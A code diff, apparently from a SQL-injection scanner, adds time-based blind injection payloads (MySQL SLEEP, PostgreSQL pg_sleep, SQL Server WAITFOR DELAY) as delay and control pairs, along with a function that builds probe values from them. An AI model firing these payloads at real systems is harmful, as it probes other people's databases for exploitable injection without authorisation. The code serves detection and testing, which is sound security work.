@@ -162,6 +162,61 @@ def quote_parity_payloads(baseline_value: str) -> tuple[tuple[str, str], ...]:
     )
 
 
+# The number of seconds a time-delay payload asks the backend to sleep. Large
+# enough that a real injected sleep towers over ordinary network/render jitter,
+# small enough to stay under the probe timeout with margin.
+_TIME_DELAY_SECONDS = 5
+
+# Time-based BLIND payload ladder — the ONLY channel for a fully-blind injection
+# that neither toggles a visible boolean nor surfaces an error (no reflected
+# output, no status change). Each entry is (delay_suffix, control_suffix): the
+# delay arm asks the backend to sleep N seconds, the control arm is byte-for-byte
+# the same shape asking it to sleep 0 seconds. So the ONLY difference between the
+# two requests is the sleep DURATION — a reflected value cannot add server-side
+# seconds, and a backend that never executes the injected SQL runs both equally
+# fast. The ladder spans the common dialects and both the string-quoted and
+# numeric/stacked contexts; whichever one the backend actually executes is the
+# one whose delay arm runs slow while its control stays fast. {N} / {Z} are
+# substituted with the sleep seconds (N) and zero (Z).
+_TIME_DELAY_SUFFIX_TEMPLATES: tuple[tuple[str, str], ...] = (
+    # MySQL / MariaDB — string context and numeric/open context
+    ("' AND SLEEP({N})-- -", "' AND SLEEP({Z})-- -"),
+    (" AND SLEEP({N})-- -", " AND SLEEP({Z})-- -"),
+    ("') AND SLEEP({N})-- -", "') AND SLEEP({Z})-- -"),
+    # PostgreSQL — string-concat (PortSwigger's canonical form) and stacked
+    ("'||pg_sleep({N})-- -", "'||pg_sleep({Z})-- -"),
+    ("'; SELECT pg_sleep({N})-- -", "'; SELECT pg_sleep({Z})-- -"),
+    (" AND 1=(SELECT 1 FROM PG_SLEEP({N}))-- -", " AND 1=(SELECT 1 FROM PG_SLEEP({Z}))-- -"),
+    # Microsoft SQL Server — stacked WAITFOR
+    ("'; WAITFOR DELAY '0:0:{N}'-- -", "'; WAITFOR DELAY '0:0:{Z}'-- -"),
+    ("; WAITFOR DELAY '0:0:{N}'-- -", "; WAITFOR DELAY '0:0:{Z}'-- -"),
+)
+
+
+def time_delay_payloads(
+    baseline_value: str,
+    *,
+    seconds: int = _TIME_DELAY_SECONDS,
+) -> tuple[tuple[str, str], ...]:
+    """
+    Build the (delay_value, control_value) pairs for the time-based blind arm.
+
+    Returns a tuple of ``(baseline_value + delay_suffix, baseline_value +
+    control_suffix)`` pairs. The delay arm asks the backend to sleep ``seconds``;
+    the control arm is the identical payload shape asking it to sleep 0 seconds.
+    The judge confirms injection only when a delay arm runs measurably slower than
+    its own control by a margin no ordinary jitter can fabricate — a signal that
+    can only originate in the backend actually executing the injected sleep.
+    """
+    return tuple(
+        (
+            baseline_value + delay.format(N=seconds, Z=0),
+            baseline_value + control.format(N=seconds, Z=0),
+        )
+        for delay, control in _TIME_DELAY_SUFFIX_TEMPLATES
+    )
+
+
 def _as_str(value: Any, field_name: str) -> str:
     if not isinstance(value, str) or not value.strip():
         raise ValueError(
